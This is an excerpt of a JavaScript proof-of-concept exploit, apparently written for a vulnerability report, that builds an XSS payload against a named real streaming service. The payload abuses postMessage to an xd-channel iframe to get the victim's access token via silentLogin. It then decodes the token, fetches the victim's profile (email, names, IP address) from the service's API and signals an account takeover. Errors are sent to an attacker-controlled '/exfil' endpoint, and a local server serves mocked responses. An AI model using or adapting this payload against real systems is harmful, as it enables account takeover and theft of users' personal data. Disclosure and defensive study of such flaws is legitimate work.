 ...
 *
 * Attack vector: XSS sends postMessage to the xd-channel.html iframe
 * which responds with the victim's access token via silentLogin.
 */
...
function buildXSSPayload(server) {
  // XSS payload that steals token via postMessage to xd-channel iframe
  return `(async()=>{try{` +
    // Step 1: Listen for silentLogin response from xd-channel iframe
    `var tokenData=await new Promise((ok,fail)=>{` +
      `var t=setTimeout(()=>fail('timeout'),8000);` +
      `window.addEventListener('message',function h(e){` +
        ...
        `}}catch(x){}` +
      `});` +
      // Step 2: Send request to xd-channel iframe
    ...
    `});` +
    // Step 3: Use stolen token to read victim profile from Fox API
    `var tk=tokenData.token;` +
    `var uid=JSON.parse(atob(tk.split('.')[1])).uid;` +
    `var pid=atob(uid);` +
    `var r=await fetch('https://api3.fox.com/v2.0/update/'+encodeURIComponent(btoa(pid).replace(/=/g,'')),` +
    ...
    `var p={token:tk,profileId:profile.profileId,email:profile.email,` +
      `displayName:profile.displayName,firstName:profile.firstName,` +
      `viewerId:profile.viewerId,ipAddress:profile.ipAddress,domain:document.domain};` +
    ...
    `b.textContent='Account Takeover - Stolen: '+profile.email+' ('+profile.profileId+')';` +
    `document.body.prepend(b)` +
  `}catch(e){new Image().src='${server}/exfil?err='+encodeURIComponent(e)}})()`;
}
...
const server = http.createServer((req, res) => {
  ...
  if (urlPath === '/alert') {
    const simple = {
      data: { status: { success: true, code: 200 }, existing_total: 1,
